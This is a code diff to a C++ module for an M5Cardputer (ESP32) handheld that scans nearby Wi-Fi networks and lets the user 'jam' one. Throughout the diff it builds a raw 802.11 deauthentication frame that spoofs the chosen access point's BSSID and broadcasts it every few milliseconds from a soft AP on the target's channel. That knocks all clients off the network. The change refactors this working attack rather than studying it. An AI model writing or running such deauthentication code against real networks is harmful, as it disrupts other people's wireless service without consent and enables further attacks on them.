@@ -1,7 +1,7 @@
 #pragma once
 #include <M5Cardputer.h>
 #include <WiFi.h>
-#include "esp_wifi.h"
+#include <esp_wifi.h>
 #include "esp_system.h"
 #include "../main_menu.h"
 
@@ -25,10 +25,10 @@ public:
 
     void enter() {
         jamming_ = false;
+        deauthApStarted_ = false;
         selectedIdx_ = 0;
         apCount_ = 0;
-        txOk_ = 0;
-        txErr_ = 0;
+        deauthFrameCount_ = 0;
         scanNetworks();
         draw();
     }
@@ -71,23 +71,18 @@ public:
     }
 
 private:
-    static constexpr uint8_t DEAUTH_FRAME_DEFAULT[26] = {
-        0xc0, 0x00, 0x3a, 0x01,
-        0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-        0xf0, 0xff, 0x02, 0x00
-    };
-
     ApEntry aps_[MAX_APS];
     int apCount_ = 0;
     int selectedIdx_ = 0;
     bool jamming_ = false;
-    uint32_t txOk_ = 0;
-    uint32_t txErr_ = 0;
-    uint8_t deauthFrame_[sizeof(DEAUTH_FRAME_DEFAULT)];
-    unsigned long lastSendMs_ = 0;
-    unsigned long lastUiMs_ = 0;
+    bool deauthApStarted_ = false;
+
+    uint8_t deauthFrame_[26];
+    uint8_t targetBSSID_[6];
+    int targetChannel_ = 1;
+    unsigned long deauthLastSend_ = 0;
+    unsigned long deauthLastDisplay_ = 0;
+    uint32_t deauthFrameCount_ = 0;
 
     void scanNetworks() {
         auto& d = M5Cardputer.Display;
@@ -127,81 +122,75 @@ private:
         WiFi.scanDelete();
     }
 
-    void wslBypasserSendRawFrame(const uint8_t* frameBuffer, int size) {
-        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frameBuffer, size, false);
-        if (err == ESP_OK) {
-            txOk_++;
-            Serial.println(" -> Sent deauth frame");
-        } else {
-            txErr_++;
-        }
-    }
-
-    void wslBypasserPrepareDeauthFrame(const uint8_t* bssid, uint8_t chan) {
-        Serial.print("Preparing deauth frame to -> ");
-        for (int j = 0; j < 6; j++) {
-            Serial.print(bssid[j], HEX);
-            if (j < 5) Serial.print(":");
-        }
-        Serial.println();
-
-        memcpy(deauthFrame_, DEAUTH_FRAME_DEFAULT, sizeof(DEAUTH_FRAME_DEFAULT));
-        esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);
-        memcpy(&deauthFrame_[10], bssid, 6);
-        memcpy(&deauthFrame_[16], bssid, 6);
-    }
-
     void startJamming() {
         if (apCount_ <= 0) return;
         const ApEntry& target = aps_[selectedIdx_];
 
-        WiFi.disconnect(false, true);
+        memcpy(targetBSSID_, target.bssid, 6);
+        targetChannel_ = target.channel;
+
+        WiFi.disconnect();
+        delay(50);
         WiFi.mode(WIFI_AP);
-        WiFi.softAP("m5_deauth", nullptr, target.channel, 1, 1);
+        delay(100);
+
+        String apSsid = "Medusa_" + String(random(1000, 9999));
+        bool ok = WiFi.softAP(apSsid.c_str(), nullptr, targetChannel_, 0, 4, false);
+        delay(150);
+        if (!ok) {
+            WiFi.mode(WIFI_OFF);
+            jamming_ = false;
+            deauthApStarted_ = false;
+            return;
+        }
+
+        esp_wifi_set_channel(targetChannel_, WIFI_SECOND_CHAN_NONE);
         delay(50);
 
-        esp_wifi_set_promiscuous(true);
-        wslBypasserPrepareDeauthFrame(target.bssid, target.channel);
+        memset(deauthFrame_, 0, sizeof(deauthFrame_));
+        deauthFrame_[0] = 0xC0; deauthFrame_[1] = 0x00;
+        deauthFrame_[2] = 0x3A; deauthFrame_[3] = 0x01;
+        memset(&deauthFrame_[4], 0xFF, 6);
+        memcpy(&deauthFrame_[10], targetBSSID_, 6);
+        memcpy(&deauthFrame_[16], targetBSSID_, 6);
+        deauthFrame_[24] = 0x07;
+        deauthFrame_[25] = 0x00;
 
-        txOk_ = 0;
-        txErr_ = 0;
-        lastSendMs_ = 0;
-        lastUiMs_ = 0;
         jamming_ = true;
+        deauthApStarted_ = true;
+        deauthFrameCount_ = 0;
+        deauthLastSend_ = 0;
+        deauthLastDisplay_ = 0;
     }
 
     void stopJamming() {
-        if (!jamming_) return;
+        if (!jamming_ && !deauthApStarted_) return;
         jamming_ = false;
-        esp_wifi_set_promiscuous(false);
-        WiFi.softAPdisconnect(true);
-        WiFi.mode(WIFI_STA);
+        if (deauthApStarted_) {
+            WiFi.softAPdisconnect(true);
+            deauthApStarted_ = false;
+        }
+        WiFi.mode(WIFI_OFF);
+        delay(50);
     }
 
     void stepJam() {
-        if (apCount_ <= 0) return;
-        unsigned long now = millis();
-        if (now - lastSendMs_ < 15) {
-            return;
-        }
-        lastSendMs_ = now;
+        if (!jamming_ || apCount_ <= 0) return;
+        if (millis() - deauthLastSend_ < 5) return;
+        deauthLastSend_ = millis();
 
-        for (int i = 0; i < 3; ++i) {
-            uint16_t seq = static_cast<uint16_t>(random(0, 4096));
-            deauthFrame_[22] = static_cast<uint8_t>((seq >> 4) & 0xFF);
-            deauthFrame_[23] = static_cast<uint8_t>((seq & 0x0F) << 4);
-            wslBypasserSendRawFrame(deauthFrame_, sizeof(deauthFrame_));
-        }
+        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame_, sizeof(deauthFrame_), false);
+        if (err == ESP_OK) deauthFrameCount_++;
 
-        if (now - lastUiMs_ >= 150) {
-            lastUiMs_ = now;
+        if (millis() - deauthLastDisplay_ > 500) {
+            deauthLastDisplay_ = millis();
             auto& d = M5Cardputer.Display;
             d.setTextSize(1);
             d.setTextColor(THEME_FG, THEME_HIGHLIGHT);
             d.setCursor(16, 86);
-            d.printf("OK: %lu  Err: %lu   ",
-                     static_cast<unsigned long>(txOk_),
-                     static_cast<unsigned long>(txErr_));
+            d.printf("Frames: %lu  Ch: %d   ",
+                     static_cast<unsigned long>(deauthFrameCount_),
+                     targetChannel_);
         }
     }
 
@@ -238,9 +227,9 @@ private:
             d.printf("CH: %d  RSSI: %ld dBm", ap.channel, static_cast<long>(ap.rssi));
 
             d.setCursor(16, 86);
-            d.printf("OK: %lu  Err: %lu",
-                     static_cast<unsigned long>(txOk_),
-                     static_cast<unsigned long>(txErr_));
+            d.printf("Frames: %lu  Ch: %d",
+                     static_cast<unsigned long>(deauthFrameCount_),
+                     targetChannel_);
 
             d.setCursor(16, 108);
             d.print("Enter: Stop Jam | `/Bksp: Back");
@@ -282,5 +271,3 @@ private:
                  static_cast<long>(aps_[selectedIdx_].rssi));
     }
 };
-
-constexpr uint8_t WifiModule::DEAUTH_FRAME_DEFAULT[26];
